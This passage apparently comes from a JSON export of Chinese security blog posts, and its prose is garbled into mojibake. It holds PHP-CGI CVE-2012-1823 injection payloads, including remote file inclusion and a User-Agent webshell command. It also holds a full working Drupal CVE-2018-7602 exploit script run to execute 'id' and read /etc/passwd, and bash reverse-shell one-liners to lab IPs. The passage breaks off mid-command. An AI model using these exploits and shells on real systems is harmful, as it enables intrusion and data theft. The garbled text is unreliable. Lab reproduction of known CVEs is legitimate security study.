é€’è€…â€ï¼Œå®ƒæ¥æ”¶webå®¹å™¨æ”¶åˆ°çš„httpæ•°æ®åŒ…ï¼Œå¹¶æŠŠé‡Œé¢çš„æ•°æ®äº¤ç»™PHPè§£é‡Šå™¨æ‰§è¡Œã€‚ - php-cgiæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€æ˜¯æä¾›cgiæ–¹å¼çš„äº¤äº’ï¼ŒäºŒæ˜¯æä¾›fastcgiæ–¹å¼çš„äº¤äº’ã€‚ - cgiæ–¹å¼ï¼šwebå®¹å™¨æ¥æ”¶åˆ°httpæ•°æ®åŒ…åï¼Œæ‹¿åˆ°ç”¨æˆ·è¯·æ±‚çš„æ–‡ä»¶ï¼ˆcgiè„šæœ¬ï¼‰ï¼Œå¹¶forké™¤ä¸€ä¸ªå­è¿›ç¨‹ï¼ˆè§£é‡Šå™¨ï¼‰å»æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åæ‹¿åˆ°æ‰§è¡Œç»“æœï¼Œç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œç„¶åå­è¿›ç¨‹ç»“æŸï¼Œä½†æ˜¯è¿™ä¸ªcgiæ¨¡å¼ä¸èƒ½æ¥æ”¶åŒæ—¶æ¥æ”¶å¤§é‡çš„è¯·æ±‚ï¼Œå› ä¸ºåˆ›å»ºè¿›ç¨‹çš„æ—¶å€™ä¼šæ¶ˆè€—æœåŠ¡å™¨èµ„æºï¼Œèµ„æºä¹Ÿä¸æ˜¯æ— é™çš„ï¼Œæ‰€ä»¥æœ‰äº†fastcgi 0x03 æ¼æ´å¤ç° é…ç½®å¥½è®¿é—®8080ç«¯å£ï¼Œå¦‚å›¾åˆ™ä»£è¡¨æ­å»ºæˆåŠŸ æ¥ä¸‹æ¥æ˜¯æ¼æ´åˆ©ç”¨ 1. æºç æ³„éœ² ç®€å•çš„åˆ©ç”¨æ–¹å¼å°±æ˜¯-så¯ä»¥ç›´æ¥æ˜¾ç¤ºæºç  è®¿é—®ä¸åŒé¡µé¢å‡èƒ½æ˜¾ç¤ºæºç  2. æ–‡ä»¶åŒ…å« -då‚æ•°å°±æ˜¯æ–‡ä»¶åŒ…å« -d+allow_url_include%3don+-d+auto_append_file%3dphp://input éœ€è¦æ³¨æ„çš„æ˜¯ =è¦ç”¨%3d(urlç¼–ä¸‹ç ) ç©ºæ ¼ç”¨+å·ä»£æ›¿æˆ–è€…%20 -d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input ä¸Šé¢ä¸¤ç§éƒ½è¡Œåªä¸è¿‡ä¸€ä¸ªåœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶ä¸€ä¸ªæ˜¯é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶ auto_prepend_file åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶ auto_append_file åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶ æˆ‘ä»¬urlè¾“å…¥åæŠ“åŒ…ä¿®æ”¹ 3. è¿œç¨‹æ–‡ä»¶åŒ…å« payload: -d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt ä¸Šä¼ ä¹‹åå°è¯•èšå‰‘è¿ï¼Œé“¾æ¥åœ°å€ä¸ºhttp://192.168.17.128:8080/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt 4. æœ¬åœ°åŒ…å« payload: curl -H \"USER-AGENT:&lt;?php echo system($_GET[\"hk\"]);?&gt;\" url -d auto_prepend_file%3d/proc/self/environ+-n è¿™é‡Œä»‹ç»ä¸‹/proc/self/environåœ¨æ–‡ä»¶åŒ…å«ä¸­çš„ä½œç”¨ å¦‚æœæœåŠ¡å™¨å·²è¿‡å“åº”æ—¶é—´ï¼Œè¿˜å¯ä»¥é€šè¿‡LFIé‡æ–°åˆ©ç”¨ï¼ŒåŒ…æ‹¬å­˜å‚¨åœ¨User_Agentçš„/proc/self/environæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†æŠŠæˆ‘ä»¬çš„PHPä»£ç æ”¾ç½®å…¶ä¸­ç”¨äºæ‰§è¡ŒCMDå‘½ä»¤ ä¸Šè¿°ä¸ºbpæŠ“åŒ…ä¿®æ”¹ ä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥è¿›è¡Œæœ¬åœ°åŒ…å«çš„ ä½¿ç”¨curlæ¥å®Œæˆ payload: curl -H \"USER-AGENT:\" http://192.168.17.128:8080/index.php?-d+auto_prepend_file%3d/proc/self/environ+-n -o 1.txt 0x04 å‚è€ƒæ–‡ç«  ï¼ˆCVE-2012-1823ï¼‰PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ è½¯ä»¶æ¼æ´â€”â€”PHP-CGIï¼ˆCVE-2012-1823ï¼‰ --æ­é…msfåå¼¹shell","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰","path":"/2023/09/19/drupal-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-7602/","content":"0x01 æ¼æ´æ¦‚è¿° â€‹ è¿™ä¸ªæ¼æ´æ˜¯CVE-2018-7600çš„ç»•è¿‡åˆ©ç”¨ï¼Œä¸¤ä¸ªæ¼æ´åŸç†æ˜¯ä¸€æ ·çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸åŒæ–¹å¼åˆ©ç”¨è¯¥æ¼æ´è¿œç¨‹æ‰§è¡Œä»£ç ã€‚CVE-2018-7602è¿™ä¸ªæ¼æ´æ˜¯CVE-2018-7600çš„å¦ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œåªæ˜¯å…¥å£æ–¹å¼ä¸ä¸€æ ·ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦å‚æ•°å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡æ­£ç¡®çš„è¿‡æ»¤ï¼Œå°±å¾ˆæœ‰å¯èƒ½å‡ºé—®é¢˜ã€‚ 0x02 å½±å“ç‰ˆæœ¬ Drupal &lt; 7.58 Drupal &lt; 8.3.9 Drupal &lt; 8.4.6 Drupal &lt; 8.5.1 0x03 ç¯å¢ƒæ­å»º å®æˆ˜ç¯å¢ƒï¼š å†å²ç‰ˆæœ¬ https://www.drupal.org/project/drupal/releases 0x04 æ¼æ´å¤ç° è¿™é‡Œç›´æ¥ç”¨dockerå¯åŠ¨äº† ç¯å¢ƒå¯åŠ¨åè®¿é—®å¦‚ä¸‹é“¾æ¥ï¼Œå°†ä¼šçœ‹åˆ°drupalçš„å®‰è£…é¡µé¢ã€‚å¦‚æœæ²¡æœ‰mysqlç¯å¢ƒï¼Œå®‰è£…çš„æ—¶å€™å¯ä»¥é€‰æ‹©sqliteæ•°æ®åº“ã€‚å…¶ä»–é…ç½®å‡é»˜è®¤å³å¯ã€‚è¿™é‡Œæˆ‘é€‰æ‹©sqlite ![image-20230919192154141](Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰/image-20230919192154141.png) ![image-20230919192453204](Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰/image-20230919192453204.png) åé¢æ— è„‘é»˜è®¤ åˆ©ç”¨åŸç†ï¼šå¯¹URLä¸­çš„#è¿›è¡Œç¼–ç ä¸¤æ¬¡ï¼Œç»•è¿‡sanitize()å‡½æ•°è¿‡æ»¤ è¿™é‡Œç›´æ¥ä¸Špocäº†ï¼Œé¡¹ç›®åœ°å€ï¼šhttps://github.com/pimps/CVE-2018-7600 #!/usr/bin/env python3 import requests import argparse from bs4 import BeautifulSoup def get_args(): //è·å–å‚æ•° parser = argparse.ArgumentParser( prog=\"drupa7-CVE-2018-7602.py\", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50), epilog= ''' This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58 using an valid account and poisoning the cancel account form (user_cancel_confirm_form) with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax). ''') parser.add_argument(\"user\", help=\"Username\") //ç”¨æˆ·å parser.add_argument(\"password\", help=\"Password\") //å¯†ç  parser.add_argument(\"target\", help=\"URL of target Drupal site (ex: http://target.com/)\") //ç›®æ ‡ parser.add_argument(\"-c\", \"--command\", default=\"id\", help=\"Command to execute (default = id)\") //å‚æ•° parser.add_argument(\"-f\", \"--function\", default=\"passthru\", help=\"Function to use as attack vector (default = passthru)\") parser.add_argument(\"-x\", \"--proxy\", default=\"\", help=\"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)\") args = parser.parse_args() return args def pwn_target(target, username, password, function, command, proxy): requests.packages.urllib3.disable_warnings() //åˆ¤æ–­æŠ“åŒ…æ— è¯¯ session = requests.Session() //è·å–seesion proxyConf = {'http': proxy, 'https': proxy} //none proxy try: print('[*] Creating a session using the provided credential...') get_params = {'q':'user/login'} //æ„é€ get post_params = {'form_id':'user_login', 'name': username, 'pass' : password, 'op':'Log in'} //æ„é€ post print('[*] Finding User ID...') session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) //æ„é€ postseesion get_params = {'q':'user'} r = session.get(target, params=get_params, verify=False, proxies=proxyConf) //æ„é€ getseesion soup = BeautifulSoup(r.text, \"html.parser\") //çˆ¬å–é¡µé¢ user_id = soup.find('meta', {'property': 'foaf:name'}).get('about') //æŠ“å…³é”®å­— if (\"?q=\" in user_id): user_id = user_id.split(\"=\")[1] //ä»¥=ä½œåˆ†éš”ç¬¦ï¼Œå†é€šè¿‡ç´¢å¼•[1]å–å‡ºæ‰€å¾—æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ çš„å€¼ if(user_id): print('[*] User ID found: ' + user_id) //ä»¥ä¸Šä¸»è¦æŠ“å–user_idå€¼ print('[*] Poisoning a form using \\'destination\\' and including it in cache.') get_params = {'q': user_id + '/cancel'} r = session.get(target, params=get_params, verify=False, proxies=proxyConf) soup = BeautifulSoup(r.text, \"html.parser\") form = soup.find('form', {'id': 'user-cancel-confirm-form'}) form_token = form.find('input', {'name': 'form_token'}).get('value') //ä»¥ä¸Šä¸»è¦è·å–form_tokenå‚æ•°å€¼ // %23æ˜¯#çš„URLç¼–ç  //å…¶ä¸­%2523æ˜¯å¯¹#çš„ä¸¤æ¬¡URLç¼–ç  %25æ˜¯%çš„URLç¼–ç  //ä¾‹å¦‚ï¼šPOST /drupal-7.59/drupal-7.59/node/9/delete?destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=id get_params = {'q': user_id + '/cancel', 'destination' : user_id +'/cancel?q[%23post_render][]=' + function + '&amp;q[%23type]=markup&amp;q[%23markup]=' + command } // # ç»•è¿‡sanitize(),stripDangrousValueså‡½æ•°æ£€æŸ¥ã€‚ //åœ¨Drupalåº”ç”¨å¯¹destination URLè¿›è¡Œå¤„ç†æ—¶ï¼Œä¼šå†æ¬¡è§£ç %23,è·å¾—# post_params = {'form_id':'user_cancel_confirm_form','form_token': form_token, '_triggering_element_name':'form_id', 'op':'Cancel account'} r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) soup = BeautifulSoup(r.text, \"html.parser\") form = soup.find('form', {'id': 'user-cancel-confirm-form'}) form_build_id = form.find('input', {'name': 'form_build_id'}).get('value') //å…³é”®ç‚¹æ˜¯è®©ç³»ç»Ÿç¼“å­˜ä¸€ä¸ªform_build_idï¼Œè¿™ä¸ªformå­˜ç€æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„å‚æ•°ï¼Œç¬¬äºŒä¸ªè¯·æ±‚ä»ä¸­å–å‡ºæ¥ç„¶åæ‰§è¡Œ //è§¦å‘æ¼æ´è¿˜æ˜¯éœ€è¦å‘ä¸¤ä¸ªpoståŒ…ï¼Œä¸€ä¸ªå­˜å…¥form_build_idä¸€ä¸ªå–å‡ºåæ‰§è¡Œ if form_build_id: print('[*] Poisoned form ID: ' + form_build_id) print('[*] Triggering exploit to execute: ' + command) get_params = {'q':'file/ajax/actions/cancel/#options/path/' + form_build_id} post_params = {'form_build_id':form_build_id} r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) parsed_result = r.text.split('[{\"command\":\"settings\"')[0] print(parsed_result) except: print(\"ERROR: Something went wrong.\") raise def main(): print () print ('===================================================================================') print ('| DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602) |') print ('| by pimps |') print ('=================================================================================== ') args = get_args() # get the cl args //return args pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip()) //ç›®æ ‡ï¼Œç”¨æˆ·åï¼Œå¯†ç ï¼Œå‚æ•°å€¼ if __name__ == '__main__': main() å¦‚å›¾æ‰€ç¤ºï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯å¤ç°è¯¥æ¼æ´ã€‚ ç¤ºä¾‹å‘½ä»¤ä¸º ï¼Œå¦‚å›¾çº¢æ¡†ä¸­æ˜¾ç¤ºï¼Œå¯ä»¥æ‰§è¡Œè¯¥å‘½ä»¤ # \"id\"ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ ç¬¬ä¸€ä¸ªdrupalä¸ºç”¨æˆ·å ç¬¬äºŒä¸ªdrupalä¸ºå¯†ç  python3 drupa7-CVE-2018-7602.py -c \"id\" hybcx 123456 http://192.168.17.128:8081/ ![image-20230919194317426](Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰/image-20230919194317426.png) æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ python3 drupa7-CVE-2018-7602.py -c \"uname -a\" hybcx 123456 http://192.168.17.128:8081/ ![image-20230919194404102](Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰/image-20230919194404102.png) æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶ python3 drupa7-CVE-2018-7602.py -c \"cat ../../../../../../../etc/passwd\" hybcx 123456 http://192.168.17.128:8081/ ![image-20230919194525463](Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰/image-20230919194525463.png) 0x05 å‚è€ƒæ–‡ç«  CVE-2018-7602 DRUPAL å†…æ ¸è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ --ä»£ç å®¡è®¡å±‚é¢ Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7602ï¼‰","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"åå¼¹shellçš„æ–¹æ³•æ€»ç»“","path":"/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/","content":"ä¸€ã€å‰è¨€ 1. ä»€ä¹ˆæ˜¯åå¼¹shell å°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚reverse shellä¸telnetï¼Œsshç­‰æ ‡å‡†shellå¯¹åº”ï¼Œæœ¬è´¨ä¸Šæ˜¯ç½‘ç»œæ¦‚å¿µçš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è§’è‰²åè½¬ã€‚ å‡è®¾æœ‰ä¸¤å°ä¸»æœº A(æ§åˆ¶ç«¯) B(è¢«æ§ç«¯) æ­£å‘shellï¼Œå°±æ˜¯sshã€Telnetçš„è¿æ¥ï¼ŒAä¸»åŠ¨å‘èµ·è¿æ¥BæŒ‡å®šç«¯å£ï¼Œç„¶åAå°±å¯ä»¥é€šè¿‡å‘½ä»¤æ§åˆ¶Bäº† åå¼¹shellï¼ŒAå…ˆå¼€å¯ä¸€ä¸ªç›‘å¬ç«¯å£ï¼Œè®©Bå»è¿æ¥Açš„è¿™ä¸ªç«¯å£ï¼Œè¿æ¥æˆåŠŸåï¼ŒAå°±èƒ½æ§åˆ¶Bäº† 2. ä¸ºä»€ä¹ˆéœ€è¦åå¼¹shellï¼Ÿ åå¼¹shellé€šå¸¸ç”¨äºè¢«æ§ç«¯å› é˜²ç«å¢™å—é™ã€æƒé™ä¸è¶³ã€ç«¯å£è¢«å ç”¨ç­‰æƒ…å½¢ã€‚åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€å› ä¸ºç«¯å£é™åˆ¶è€Œæ— æ³•ç›´è¿ç›®æ ‡æœºå™¨ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡åå¼¹shellæ¥è·å–ä¸€ä¸ªäº¤äº’å¼shellï¼Œä»¥ä¾¿ç»§ç»­æ·±å…¥ã€‚ä»¥ä¸‹è¯¦ç»†ä»‹ç»Windowså’ŒLinuxç³»ç»Ÿä¸‹åå¼¹shellçš„å‡ ç§æ–¹å¼ã€‚ äºŒã€åå¼¹shellå‘½ä»¤è§£æ 1. å‘½ä»¤è§£æ ä¾‹å¦‚ï¼šbash -i &gt;&amp; /dev/tcp/192.168.1.1/9090 0&gt;&amp;1 bash -i bash -iï¼Œæ„ä¸ºåˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„bash shell /dev/tcp/192.168.1.1/9090 devæ˜¯è®¾å¤‡(device)çš„è‹±æ–‡ç¼©å†™ã€‚è¿™é‡Œä¸»è¦å­˜æ”¾ä¸è®¾å¤‡ï¼ˆåŒ…æ‹¬å¤–è®¾ï¼‰æœ‰å…³çš„æ–‡ä»¶ /dev/tcp/æ˜¯linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡ï¼Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œè¯»å†™è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚åŒç†ï¼Œlinuxä¸­è¿˜å­˜åœ¨/dev/upd/ æ‰€ä»¥ä¸Šè¿°å‘½ä»¤æ˜¯å’Œ192.168.1.1:9090å»ºç«‹TCPè¿æ¥ è™½ç„¶/dev/tcp/${HOST}/${PORT}è¿™ä¸ªå­—ç¬¦è™½ç„¶çœ‹èµ·æ¥åƒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä½äº/devè¿™ä¸ªè®¾å¤‡æ–‡ä»¶å¤¹ä¸‹ ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œå¹¶ä¸”ä¸æ˜¯ä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ã€‚è¿™åªæ˜¯bashå®ç°çš„ç”¨æ¥å®ç°ç½‘ç»œè¯·æ±‚çš„ä¸€ä¸ªæ¥å£ï¼Œå…¶å®å°±åƒæˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼ŒæŒ‰ç…§æŒ‡å®šçš„æ ¼å¼è¾“å…¥host portå‚æ•°ï¼Œå°±èƒ½å‘èµ·ä¸€ä¸ªsocketè¿æ¥ 2. æ–‡ä»¶æè¿°ç¬¦ Linuxç³»ç»Ÿä¸­ï¼ŒæŠŠä¸€åˆ‡éƒ½çœ‹åšæ˜¯æ–‡ä»¶ï¼Œå½“è¿›ç¨‹æ‰“å¼€ç°æœ‰æ–‡ä»¶æˆ–åˆ›å»ºæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ–‡ä»¶æè¿°ç¬¦å°±æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œç”¨æ¥æŒ‡å‘è¢«æ‰“å¼€çš„æ–‡ä»¶ æ‰€æœ‰æ‰§è¡ŒI/Oæ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½ä¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦ï¼Œå³æ–‡ä»¶æè¿°ç¬¦å¯æ§åˆ¶è¾“å…¥è¾“å‡ºï¼ˆè¾“å‡º/è¾“å‡ºé‡å®šå‘ï¼‰ æ ‡å‡†è¾“å…¥(stdin) ä»£ç ä¸º0 ä½¿ç”¨&lt;æˆ–&lt;&lt; é»˜è®¤è®¾å¤‡é”®ç›˜ æ ‡å‡†è¾“å‡º(stdout) ä»£ç ä¸º1 ä½¿ç”¨&gt;æˆ–&gt;&gt; é»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ æ ‡å‡†é”™è¯¯è¾“å‡º(stderr) ä»£ç ä¸º2 ä½¿ç”¨2&gt;æˆ–2&gt;&gt; é»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ å¤§å¤šæ•°Linuxç³»ç»Ÿå‘½ä»¤ä»ä½ çš„ç»ˆç«¯æ¥å—è¾“å…¥å¹¶å°†æ‰€äº§ç”Ÿçš„è¾“å‡ºå‘é€å›åˆ°æ‚¨çš„ç»ˆç«¯ã€‚ä¸€ä¸ªå‘½ä»¤é€šå¸¸ä»ä¸€ä¸ªå«æ ‡å‡†è¾“å…¥çš„åœ°æ–¹è¯»å–è¾“å…¥ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™æ°å¥½æ˜¯ä½ çš„ç»ˆç«¯ã€‚åŒæ ·ï¼Œä¸€ä¸ªå‘½ä»¤é€šå¸¸å°†å…¶è¾“å…¥å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¹Ÿæ˜¯ä½ çš„ç»ˆç«¯ã€‚ shell è¾“å…¥/è¾“å‡ºé‡å®šå‘ å¦‚ä¸Šï¼Œæˆ‘ä»¬æ­£å¸¸ä½¿ç”¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œé»˜è®¤è¾“å…¥è¾“å‡ºçš†æ˜¯ç»ˆç«¯ã€‚ 3. è¾“å‡ºé‡å®šå‘ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†è¾“å‡ºç»“æœé‡å®šå‘åˆ°å…¶ä»–åœ°æ–¹ 1ï¸âƒ£ ä½¿ç”¨ 1&gt; å°†è¾“å‡ºç»“æœå†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–‡ä»¶ï¼Œæ–‡ä»¶å¦‚æœå­˜åœ¨ä¼šè¦†ç›–åŸæ–‡ä»¶å†…å®¹ 1&gt; ä¸­çš„1æ˜¯é»˜è®¤çš„å¯ä»¥å¿½ç•¥ä¸å†™ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å†™æˆ&gt; åŒç†0&lt;å¯ä»¥å†™æˆ&lt; 2ï¸âƒ£ ä½¿ç”¨&gt;&gt;ä¼šè¿½åŠ å†…å®¹åœ¨æ–‡ä»¶æœ«å°¾ 3ï¸âƒ£å®ä¾‹ æ§åˆ¶ç«¯ï¼škali è¢«æ§ç«¯ï¼šcentos kaliç›‘å¬8888ç«¯å£ centosè¾“å…¥å‘½ä»¤ echo hello &gt; /dev/tcp/192.168.17.128/8888 kaliç›‘å¬åˆ°è¾“å‡ºç»“æœ 4. è¾“å…¥é‡å®šå‘ kaliç»§ç»­ç›‘å¬ç«¯å£ï¼Œcentosè¾“å…¥å‘½ä»¤ bash -i &gt; /dev/tcp/192.168.17.128/8888 kaliå¾—åˆ°è¾“å‡ºç»“æœ è¿™ç§æ–¹æ³•çš„è¯ï¼Œcentosè¾“ä¸€æ¡å‘½ä»¤ï¼Œkaliåˆ™å›æ˜¾ä¸€æ¡å‘½ä»¤è¾“å‡ºç»“æœ è¾“å…¥è¾“å‡ºç»“åˆè·å¾—shell ä¸¤æ¡å‘½ä»¤ bash -i &gt; /dev/tcp/192.168.17.128/8888 bash -i &lt; /dev/tcp/192.168.17.128/8888 ç»“åˆä¸€ä¸‹ï¼Œå³å¯å®ç°åå¼¹shell bash -i &gt;&amp; /dev/tcp/192.168.17.128/8888 0&gt;&amp;1 1ï¸âƒ£ 0&gt;&amp;1 è¯­æ³•æ ¼å¼æ˜¯ &gt;&amp;word å½“wordä¸ºæ•°å­—æˆ–è€…-æ—¶ï¼Œè¡¨ç¤ºå¤åˆ¶æ–‡ä»¶æè¿°ç¬¦ å¤åˆ¶æ ¼å¼æœ‰num1&lt;&amp;num2å’Œnum1&gt;&amp;num2ï¼ŒåŒºåˆ«æ˜¯ï¼Œå‰è€…æ˜¯ä»¥åªè¯»çš„å½¢å¼æ‰“å¼€ï¼Œåè€…æ˜¯ä»¥å†™çš„å½¢å¼æ‰“å¼€ï¼Œè¿™é‡Œä¸¤è€…å‡å¯ 0&gt;&amp;1è¿™é‡Œæ„æ€æ˜¯å°†0[æ ‡å‡†è¾“å…¥]é‡å®šå‘åˆ°äº†1[æ ‡å‡†è¾“å‡º]æŒ‡å‘çš„ä½ç½® 2ï¸âƒ£ &gt;&amp; å½“wordä¸æ˜¯æ•°å­—æˆ–-å­—ç¬¦æ—¶ï¼Œ&gt;&amp;è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡ºåˆå¹¶åˆ°æ ‡å‡†è¾“å‡ºä¸­ ä¸‰ã€linuxä¸‹åå¼¹shell å®éªŒç¯å¢ƒï¼š Win10 192.168.17.135 NCç›‘å¬ Kali 192.168.17.128 è‡ªå¸¦å·¥å…· 1. bashåå¼¹ bash -i &gt;&amp; /dev/tcp/192.168.17.135/7777 0&gt;&amp;1 è¿™é‡Œä¹Ÿæ˜¯å´©æºƒäº†ï¼Œç¬¬ä¸€ç§åå¼¹æ–¹æ³•å°±é‡åˆ°äº†éšœç¢ï¼Œæˆ‘å‘ç°æˆ‘çš„kaliç”¨ä¸äº†ä¸Šè¿°çš„æ–¹æ³•ï¼Œå®ƒè¡¨æ˜/dev/tcpæ–‡ä»¶ä¸å­˜åœ¨ï¼Œç½‘ä¸Šæ¼«æ¸¸å‘ç° linuxä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶/dev/tcp,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç±»ä¼¼äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œè¯»å†™è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚ ä½†æ˜¯/dev/tcpæœ¬èº«æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ— æ³•åœ¨/devä¸‹çœ‹åˆ°è¿™ä¸ªè®¾å¤‡èŠ‚ç‚¹ã€‚ è€Œåœ¨bashä¸­é€šè¿‡æ‰“å¼€/dev/tcpæ¥å–å¾—socketçš„åŠŸèƒ½å®é™…ä¸Šæ˜¯bashçš„ç‰¹æ€§ï¼Œå¹¶ä¸æ˜¯ç³»ç»Ÿçš„åŠŸèƒ½ã€‚ äºæ˜¯æœ‰äº›ç‰ˆæœ¬çš„bashå¯èƒ½é»˜è®¤ä¸æ”¯æŒå¯¹/dev/tcpçš„æ‰“å¼€ã€‚æ­¤æ—¶å¯ä»¥åœ¨ç¼–è¯‘bashçš„æ—¶å€™å¢åŠ ä¸€ä¸ªå‚æ•°ï¼šâ€“enable-net-redirectionsç„¶åé‡æ–°ç¼–è¯‘bashå³å¯ã€‚ ä½†æˆ‘æ²¡æœ‰å¢åŠ å‚æ•°ï¼Œå› ä¸ºæˆ‘å½“æ—¶è®¤ä¸ºæˆ‘bashç‰ˆæœ¬åº”è¯¥å¾ˆé«˜ï¼Œå·²ç»é»˜è®¤å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ ï¼Œäºæ˜¯æˆ‘è·Ÿç€æ–‡ç« æŸ¥çœ‹äº†å½“å‰shellç¯å¢ƒï¼Œå‘ç°ä¸ºzshï¼Œäºæ˜¯æˆ‘æ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ç”¨äºæ°¸ä¹…ä½¿ç”¨bashå‘½ä»¤ã€‚å‚è€ƒæ–‡ç« åœ¨ä¸‹é¢ ä½†æœ‰å¼ºè¿«ç—‡çš„æˆ‘ï¼Œæ¥ç€æ ¹æ®å‡ ä¸ªå…³é”®è¯æœå¯»linuxä¸‹å¦‚ä½•åˆ‡æ¢shellç¯å¢ƒï¼Œç»ˆäºæ‰¾åˆ°äº†æ°¸ä¹…åˆ‡æ¢æ–‡ç« ï¼Œè¿™é‡Œä¹Ÿæ”¾åˆ°ä¸‹é¢ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œå°±å‡ æ¡å‘½ä»¤è€Œå·² åœ¨ç‰¹æ®Šæƒ…å†µå¯ä»¥ä½¿ç”¨base64ç¼–ç æ‰§è¡Œbashåå¼¹shell bash -c 